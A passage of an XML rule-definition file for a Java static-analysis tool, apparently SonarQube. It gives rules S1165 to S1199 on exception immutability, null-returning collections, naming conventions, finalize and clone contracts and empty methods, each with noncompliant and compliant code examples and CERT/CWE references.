            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/FTZGBQ&quot;&gt;CERT, ERR05-J.&lt;/a&gt; -
            Do not let checked exceptions escape from a finally block &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>error-handling</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1165' priority='MINOR'>
        <configKey>S1165</configKey>
        <name>Exception classes should be immutable</name>
        <description>
            &lt;p&gt;Exceptions are meant to represent the application's state at the point at which an error occurred.&lt;/p&gt;
            &lt;p&gt;Making all fields in an &lt;code&gt;Exception&lt;/code&gt; class &lt;code&gt;final&lt;/code&gt;
            ensures that this state:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Will be fully defined at the same time the &lt;code&gt;Exception&lt;/code&gt; is instantiated.
            &lt;/li&gt;
            &lt;li&gt; Won't be updated or corrupted by a questionable error handler. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This will enable developers to quickly understand what went wrong.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyException extends Exception {

            private int status; // Noncompliant

            public MyException(String message) {
            super(message);
            }

            public int getStatus() {
            return status;
            }

            public void setStatus(int status) {
            this.status = status;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyException extends Exception {

            private final int status;

            public MyException(String message, int status) {
            super(message);
            this.status = status;
            }

            public int getStatus() {
            return status;
            }

            }
            &lt;/pre&gt;
        </description>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1168' priority='MAJOR'>
        <configKey>S1168</configKey>
        <name>Empty arrays and collections should be returned instead of null</name>
        <description>
            &lt;p&gt;Returning &lt;code&gt;null&lt;/code&gt; instead of an actual array or collection forces callers of
            the method to explicitly test for nullity, making them more
            complex and less readable.&lt;/p&gt;
            &lt;p&gt;Moreover, in many cases, &lt;code&gt;null&lt;/code&gt; is used as a synonym for empty.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public static List&amp;lt;Result&amp;gt; getResults() {
            return null; // Noncompliant
            }

            public static Result[] getResults() {
            return null; // Noncompliant
            }

            public static void main(String[] args) {
            Result[] results = getResults();

            if (results != null) { // Nullity test required to prevent NPE
            for (Result result: results) {
            /* ... */
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static List&amp;lt;Result&amp;gt; getResults() {
            return Collections.emptyList(); // Compliant
            }

            public static Result[] getResults() {
            return new Result[0];
            }

            public static void main(String[] args) {
            for (Result result: getResults()) {
            /* ... */
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aNYxBQ&quot;&gt;CERT, MSC19-C.&lt;/a&gt; -
            For functions that return an array, prefer returning an empty array
            over a null value &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/JzZGBQ&quot;&gt;CERT, MET55-J.&lt;/a&gt; -
            Return an empty array or collection instead of a null value for
            methods that return an array or collection &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S117' priority='MINOR'>
        <configKey>S117</configKey>
        <name>Local variable and method parameter names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a
            local variable or function parameter name does
            not match the provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[a-z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            public void doSomething(int my_param) {
            int LOCAL;
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(int myParam) {
            int local;
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Loop counters are ignored by this rule.&lt;/p&gt;
            &lt;pre&gt;
            for (int i_1 = 0; i_1 &amp;lt; limit; i_1++) { // Compliant
            // ...
            }
            &lt;/pre&gt;
            &lt;p&gt;as well as one-character &lt;code&gt;catch&lt;/code&gt; variables: &lt;/p&gt;
            &lt;pre&gt;
            try {
            //...
            } catch (Exception e) { // Compliant
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the names against.</description>
            <defaultValue>^[a-z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1170' priority='MINOR'>
        <configKey>S1170</configKey>
        <name>Public constants and fields initialized at declaration should be &quot;static final&quot; rather than
            merely &quot;final&quot;
        </name>
        <description>
            &lt;p&gt;Making a &lt;code&gt;public&lt;/code&gt; constant just &lt;code&gt;final&lt;/code&gt; as opposed to
            &lt;code&gt;static final&lt;/code&gt; leads to duplicating its value for every
            instance of the class, uselessly increasing the amount of memory required to execute the application.&lt;/p&gt;
            &lt;p&gt;Further, when a non-&lt;code&gt;public&lt;/code&gt;, &lt;code&gt;final&lt;/code&gt; field isn't
            also &lt;code&gt;static&lt;/code&gt;, it implies that different instances can have
            different values. However, initializing a non-&lt;code&gt;static final&lt;/code&gt; field in its declaration
            forces every instance to have the same value. So such
            fields should either be made &lt;code&gt;static&lt;/code&gt; or initialized in the constructor.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Myclass {
            public final int THRESHOLD = 3;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Myclass {
            public static final int THRESHOLD = 3; // Compliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issues are reported on final fields of inner classes whose type is not a primitive or a String.
            Indeed according to the Java specification:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;An inner class is a nested class that is not explicitly or implicitly declared static. Inner
            classes may not declare static initializers (§8.7)
            or member interfaces. Inner classes may not declare static members, unless they are compile-time constant
            fields (§15.28).&lt;/p&gt;
            &lt;/blockquote&gt;
        </description>
        <tag>convention</tag>
    </rule>

    <rule key='S1171' priority='MAJOR'>
        <configKey>S1171</configKey>
        <name>Only static class initializers should be used</name>
        <description>
            &lt;p&gt;Non-static initializers are rarely used, and can be confusing for most developers because they only
            run when new class instances are created. When
            possible, non-static initializers should be refactored into standard constructors or field initializers.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private static final Map&amp;lt;String, String&amp;gt; MY_MAP = new HashMap&amp;lt;String, String&amp;gt;()
            {

            // Noncompliant - HashMap should be extended only to add behavior, not for initialization
            {
            put(&quot;a&quot;, &quot;b&quot;);
            }

            };
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private static final Map&amp;lt;String, String&amp;gt; MY_MAP = new HashMap&amp;lt;String, String&amp;gt;();

            static {
            MY_MAP.put(&quot;a&quot;, &quot;b&quot;);
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;or using Java 9 &lt;code&gt;Map.of&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            class MyClass {
            // Compliant
            private static final Map&amp;lt;String, String&amp;gt; MY_MAP = java.util.Map.of(&quot;a&quot;, &quot;b&quot;);
            }
            &lt;/pre&gt;
            &lt;p&gt;or using Guava:&lt;/p&gt;
            &lt;pre&gt;
            class MyClass {
            // Compliant
            private static final Map&amp;lt;String, String&amp;gt; MY_MAP = ImmutableMap.of(&quot;a&quot;, &quot;b&quot;);
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1172' priority='MAJOR'>
        <configKey>S1172</configKey>
        <name>Unused method parameters should be removed</name>
        <description>
            &lt;p&gt;Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will
            be the same.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void doSomething(int a, int b) { // &quot;b&quot; is unused
            compute(a);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void doSomething(int a) {
            compute(a);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The rule will not raise issues for unused parameters:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; that are annotated with &lt;code&gt;@javax.enterprise.event.Observes&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; in overrides and implementation methods &lt;/li&gt;
            &lt;li&gt; in interface &lt;code&gt;default&lt;/code&gt; methods &lt;/li&gt;
            &lt;li&gt; in non-private methods that only &lt;code&gt;throw&lt;/code&gt; or that have empty bodies &lt;/li&gt;
            &lt;li&gt; in annotated methods, unless the annotation is &lt;code&gt;@SuppressWarning(&quot;unchecked&quot;)&lt;/code&gt;
            or &lt;code&gt;@SuppressWarning(&quot;rawtypes&quot;)&lt;/code&gt;, in
            which case the annotation will be ignored &lt;/li&gt;
            &lt;li&gt; in overridable methods (non-final, or not member of a final class, non-static, non-private), if
            the parameter is documented with a proper
            javadoc. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            @Override
            void doSomething(int a, int b) { // no issue reported on b
            compute(a);
            }

            public void foo(String s) {
            // designed to be extended but noop in standard case
            }

            protected void bar(String s) {
            //open-closed principle
            }

            public void qix(String s) {
            throw new UnsupportedOperationException(&quot;This method should be implemented in subclasses&quot;);
            }

            /**
            * @param s This string may be use for further computation in overriding classes
            */
            protected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper
            javadoc
            compute(a);
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1174' priority='CRITICAL'>
        <configKey>S1174</configKey>
        <name>&quot;Object.finalize()&quot; should remain protected (versus public) when overriding</name>
        <description>
            &lt;p&gt;The contract of the &lt;code&gt;Object.finalize()&lt;/code&gt; method is clear: only the Garbage
            Collector is supposed to call this method.&lt;/p&gt;
            &lt;p&gt;Making this method public is misleading, because it implies that any caller can use it.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            @Override
            public void finalize() { // Noncompliant
            /* ... */
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/583.html&quot;&gt;MITRE, CWE-583&lt;/a&gt;
            - finalize() Method Declared Public &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jZGBQ&quot;&gt;CERT, MET12-J.&lt;/a&gt; -
            Do not use finalizers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1175' priority='CRITICAL'>
        <configKey>S1175</configKey>
        <name>The signature of &quot;finalize()&quot; should match that of &quot;Object.finalize()&quot;</name>
        <description>
            &lt;p&gt;&lt;code&gt;Object.finalize()&lt;/code&gt; is called by the Garbage Collector at some point after
            the object becomes unreferenced.&lt;/p&gt;
            &lt;p&gt;In general, overloading &lt;code&gt;Object.finalize()&lt;/code&gt; is a bad idea because:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The overload may not be called by the Garbage Collector. &lt;/li&gt;
            &lt;li&gt; Users are not expected to call &lt;code&gt;Object.finalize()&lt;/code&gt; and will get confused.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;But beyond that it's a terrible idea to name a method &quot;finalize&quot; if it doesn't actually
            override &lt;code&gt;Object.finalize()&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int finalize(int someParameter) { // Noncompliant
            /* ... */
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int someBetterName(int someParameter) { // Compliant
            /* ... */
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1181' priority='MAJOR'>
        <configKey>S1181</configKey>
        <name>Throwable and Error should not be caught</name>
        <description>
            &lt;p&gt;&lt;code&gt;Throwable&lt;/code&gt; is the superclass of all errors and exceptions in Java. &lt;code&gt;Error&lt;/code&gt;
            is the superclass of all errors, which are not
            meant to be caught by applications.&lt;/p&gt;
            &lt;p&gt;Catching either &lt;code&gt;Throwable&lt;/code&gt; or &lt;code&gt;Error&lt;/code&gt; will also
            catch &lt;code&gt;OutOfMemoryError&lt;/code&gt; and &lt;code&gt;InternalError&lt;/code&gt;, from
            which an application should not attempt to recover.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            try { /* ... */ } catch (Throwable t) { /* ... */ }
            try { /* ... */ } catch (Error e) { /* ... */ }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            try { /* ... */ } catch (RuntimeException e) { /* ... */ }
            try { /* ... */ } catch (MyException e) { /* ... */ }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/396.html&quot;&gt;MITRE, CWE-396&lt;/a&gt;
            - Declaration of Catch for Generic Exception &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/isocpp/CppCoreGuidelines/blob/036324/CppCoreGuidelines.md#Re-exception-types&quot;&gt;C++
            Core Guidelines E.14&lt;/a&gt; - Use
            purpose-designed user-defined types as exceptions (not built-in types) &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>cert</tag>
        <tag>cppcoreguidelines</tag>
        <tag>cwe</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1182' priority='MINOR'>
        <configKey>S1182</configKey>
        <name>Classes that override &quot;clone&quot; should be &quot;Cloneable&quot; and call
            &quot;super.clone()&quot;
        </name>
        <description>
            &lt;p&gt;&lt;code&gt;Cloneable&lt;/code&gt; is the marker &lt;code&gt;Interface&lt;/code&gt; that indicates
            that &lt;code&gt;clone()&lt;/code&gt; may be called on an object. Overriding
            &lt;code&gt;clone()&lt;/code&gt; without implementing &lt;code&gt;Cloneable&lt;/code&gt; can be useful if
            you want to control how subclasses clone themselves, but otherwise,
            it's probably a mistake.&lt;/p&gt;
            &lt;p&gt;The usual convention for &lt;code&gt;Object.clone()&lt;/code&gt; according to Oracle's Javadoc is:&lt;/p&gt;
            &lt;ol&gt;
            &lt;li&gt; &lt;code&gt;x.clone() != x&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;x.clone().getClass() == x.getClass()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;x.clone().equals(x)&lt;/code&gt; &lt;/li&gt;
            &lt;/ol&gt;
            &lt;p&gt;Obtaining the object that will be returned by calling &lt;code&gt;super.clone()&lt;/code&gt; helps
            to satisfy those invariants:&lt;/p&gt;
            &lt;ol&gt;
            &lt;li&gt; &lt;code&gt;super.clone()&lt;/code&gt; returns a new object instance &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;super.clone()&lt;/code&gt; returns an object of the same type as the one &lt;code&gt;clone()&lt;/code&gt;
            was called on &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Object.clone()&lt;/code&gt; performs a shallow copy of the object's state &lt;/li&gt;
            &lt;/ol&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class BaseClass { // Noncompliant; should implement Cloneable
            @Override
            public Object clone() throws CloneNotSupportedException { // Noncompliant; should return the super.clone()
            instance
            return new BaseClass();
            }
            }

            class DerivedClass extends BaseClass implements Cloneable {
            /* Does not override clone() */

            public void sayHello() {
            System.out.println(&quot;Hello, world!&quot;);
            }
            }

            class Application {
            public static void main(String[] args) throws Exception {
            DerivedClass instance = new DerivedClass();
            ((DerivedClass) instance.clone()).sayHello(); // Throws a ClassCastException because invariant #2 is
            violated
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class BaseClass implements Cloneable {
            @Override
            public Object clone() throws CloneNotSupportedException { // Compliant
            return super.clone();
            }
            }

            class DerivedClass extends BaseClass implements Cloneable {
            /* Does not override clone() */

            public void sayHello() {
            System.out.println(&quot;Hello, world!&quot;);
            }
            }

            class Application {
            public static void main(String[] args) throws Exception {
            DerivedClass instance = new DerivedClass();
            ((DerivedClass) instance.clone()).sayHello(); // Displays &quot;Hello, world!&quot; as expected. Invariant
            #2 is satisfied
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/580.html&quot;&gt;MITRE, CWE-580&lt;/a&gt;
            - clone() Method Without super.clone() &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/FjZGBQ&quot;&gt;CERT, MET53-J.&lt;/a&gt; -
            Ensure that the clone() method calls super.clone() &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>convention</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1185' priority='MINOR'>
        <configKey>S1185</configKey>
        <name>Overriding methods should do more than simply call the same method in the super class</name>
        <description>
            &lt;p&gt;Overriding a method just to call the same method from the super class without performing any other
            actions is useless and misleading. The only time
            this is justified is in &lt;code&gt;final&lt;/code&gt; overriding methods, where the effect is to lock in
            the parent class behavior. This rule ignores such
            overrides of &lt;code&gt;equals&lt;/code&gt;, &lt;code&gt;hashCode&lt;/code&gt; and &lt;code&gt;toString&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething() {
            super.doSomething();
            }

            @Override
            public boolean isLegal(Action action) {
            return super.isLegal(action);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Override
            public boolean isLegal(Action action) { // Compliant - not simply forwarding the call
            return super.isLegal(new Action(/* ... */));
            }

            @Id
            @Override
            public int getId() { // Compliant - there is annotation different from @Override
            return super.getId();
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>redundant</tag>
    </rule>

    <rule key='S1186' priority='CRITICAL'>
        <configKey>S1186</configKey>
        <name>Methods should not be empty</name>
        <description>
            &lt;p&gt;There are several reasons for a method not to have a method body:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; It is an unintentional omission, and should be fixed to prevent an unexpected behavior in
            production. &lt;/li&gt;
            &lt;li&gt; It is not yet, or never will be, supported. In this case an &lt;code&gt;UnsupportedOperationException&lt;/code&gt;
            should be thrown. &lt;/li&gt;
            &lt;li&gt; The method is an intentionally-blank override. In this case a nested comment should explain the
            reason for the blank override. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething() {
            }

            public void doSomethingElse() {
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Override
            public void doSomething() {
            // Do nothing because of X and Y.
            }

            @Override
            public void doSomethingElse() {
            throw new UnsupportedOperationException();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Default (no-argument) constructors are ignored when there are other constructors in the class, as
            are empty methods in abstract classes.&lt;/p&gt;
            &lt;pre&gt;
            public abstract class Animal {
            void speak() { // default implementation ignored
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S119' priority='MINOR'>
        <configKey>S119</configKey>
        <name>Type parameter names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared naming conventions make it possible for a team to collaborate efficiently. Following the
            established convention of single-letter type
            parameter names helps users and maintainers of your code quickly see the difference between a type parameter
            and a poorly named class.&lt;/p&gt;
            &lt;p&gt;This rule check that all type parameter names match a provided regular expression. The following
            code snippets use the default regular
            expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass&amp;lt;TYPE&amp;gt; { // Noncompliant
            &amp;lt;TYPE&amp;gt; void method(TYPE t) { // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass&amp;lt;T&amp;gt; {
            &amp;lt;T&amp;gt; void method(T t) {
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the type parameter names against.</description>
            <defaultValue>^[A-Z][0-9]?$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1190' priority='BLOCKER'>
        <configKey>S1190</configKey>
        <name>Future keywords should not be used as names</name>
        <description>
            &lt;p&gt;Through Java's evolution keywords have been added. While code that uses those words as identifiers
            may be compilable under older versions of Java,
            it will not be under modern versions. &lt;/p&gt;
            &lt;p&gt;Following keywords are marked as invalid identifiers &lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Keyword&lt;/th&gt;
            &lt;th&gt;Added&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;_&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;9&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;enum&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;5.0&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;p&gt;&lt;code&gt;assert&lt;/code&gt; and &lt;code&gt;strictfp&lt;/code&gt; are another example of valid
            identifiers which became keywords in later versions, but are not
            supported by this rule.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething() {
            int enum = 42; // Noncompliant
            String _ = &quot;&quot;; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething() {
            int magic = 42;
            }
            &lt;/pre&gt;
        </description>
        <tag>obsolete</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1191' priority='MAJOR'>
        <configKey>S1191</configKey>
        <name>Classes from &quot;sun.*&quot; packages should not be used</name>
        <description>
            &lt;p&gt;Classes in the &lt;code&gt;sun.*&lt;/code&gt; or &lt;code&gt;com.sun.*&lt;/code&gt; packages are
            considered implementation details, and are not part of the Java API.&lt;/p&gt;
            &lt;p&gt;They can cause problems when moving to new versions of Java because there is no backwards
            compatibility guarantee. Similarly, they can cause
            problems when moving to a different Java vendor, such as OpenJDK.&lt;/p&gt;
            &lt;p&gt;Such classes are almost always wrapped by Java API classes that should be used instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import com.sun.jna.Native; // Noncompliant
            import sun.misc.BASE64Encoder; // Noncompliant
            &lt;/pre&gt;
        </description>
        <tag>lock-in</tag>
        <tag>pitfall</tag>
        <param>
            <key>Exclude</key>
            <description>Comma separated list of Sun packages to be ignored by this rule. Example:
                com.sun.jna,sun.misc
            </description>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1192' priority='CRITICAL'>
        <configKey>S1192</configKey>
        <name>String literals should not be duplicated</name>
        <description>
            &lt;p&gt;Duplicated string literals make the process of refactoring error-prone, since you must be sure to
            update all occurrences.&lt;/p&gt;
            &lt;p&gt;On the other hand, constants can be referenced from many places, but only need to be updated in a
            single place.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default threshold of 3:&lt;/p&gt;
            &lt;pre&gt;
            public void run() {
            prepare(&quot;action1&quot;); // Noncompliant - &quot;action1&quot; is duplicated 3 times
            execute(&quot;action1&quot;);
            release(&quot;action1&quot;);
            }

            @SuppressWarning(&quot;all&quot;) // Compliant - annotations are excluded
            private void method1() { /* ... */ }
            @SuppressWarning(&quot;all&quot;)
            private void method2() { /* ... */ }

            public String method3(String a) {
            System.out.println(&quot;'&quot; + a + &quot;'&quot;); // Compliant - literal &quot;'&quot; has less than 5
            characters and is excluded
            return &quot;&quot;; // Compliant - literal &quot;&quot; has less than 5 characters and is excluded
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private static final String ACTION_1 = &quot;action1&quot;; // Compliant

            public void run() {
            prepare(ACTION_1); // Compliant
            execute(ACTION_1);
            release(ACTION_1);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;To prevent generating some false-positives, literals having less than 5 characters are excluded.&lt;/p&gt;
        </description>
        <tag>design</tag>
        <param>
            <key>threshold</key>
            <description>Number of times a literal must be duplicated to trigger an issue</description>
            <defaultValue>3</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S1193' priority='MAJOR'>
        <configKey>S1193</configKey>
        <name>Exception types should not be tested using &quot;instanceof&quot; in catch blocks</name>
        <description>
            &lt;p&gt;Multiple catch blocks of the appropriate type should be used instead of catching a general
            exception, and then testing on the type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            try {
            /* ... */
            } catch (Exception e) {
            if(e instanceof IOException) { /* ... */ } // Noncompliant
            if(e instanceof NullPointerException{ /* ... */ } // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            try {
            /* ... */
            } catch (IOException e) { /* ... */ } // Compliant
            } catch (NullPointerException e) { /* ... */ } // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/java/ERR51-J.+Prefer+user-defined+exceptions+over+more+general+exception+types&quot;&gt;CERT,
            ERR51-J.&lt;/a&gt; - Prefer user-defined exceptions over more general exception types &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>clumsy</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1195' priority='MINOR'>
        <configKey>S1195</configKey>
        <name>Array designators &quot;[]&quot; should be located after the type in method signatures</name>
        <description>
            &lt;p&gt;According to the Java Language Specification: &lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;For compatibility with older versions of the Java SE platform,&lt;/p&gt;
            &lt;p&gt;the declaration of a method that returns an array is allowed to place (some or all of) the empty
            bracket pairs that form the declaration of the
            array type after the formal parameter list.&lt;/p&gt;
            &lt;p&gt;This obsolescent syntax should not be used in new code.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int getVector()[] { /* ... */ } // Noncompliant

            public int[] getMatrix()[] { /* ... */ } // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int[] getVector() { /* ... */ }

            public int[][] getMatrix() { /* ... */ }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
    </rule>

    <rule key='S1197' priority='MINOR'>
        <configKey>S1197</configKey>
        <name>Array designators &quot;[]&quot; should be on the type, not the variable</name>
        <description>
            &lt;p&gt;Array designators should always be located on the type for better code readability. Otherwise,
            developers must look both at the type and the
            variable name to know whether or not a variable is an array.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int matrix[][]; // Noncompliant
            int[] matrix[]; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int[][] matrix; // Compliant
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
    </rule>

    <rule key='S1199' priority='MINOR'>
        <configKey>S1199</configKey>
        <name>Nested code blocks should not be used</name>
        <description>
            &lt;p&gt;Nested code blocks can be used to create a new scope and restrict the visibility of the variables
            defined inside it. Using this feature in a method
            typically indicates that the method has too many responsibilities, and should be refactored into smaller
            methods.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void evaluate(int operator) {
            // Do some computation...
            {
            int a = stack.pop();
            int b = stack.pop();
            int result = a + b;
            stack.push(result);
            }
            }
            &lt;/pre&gt;
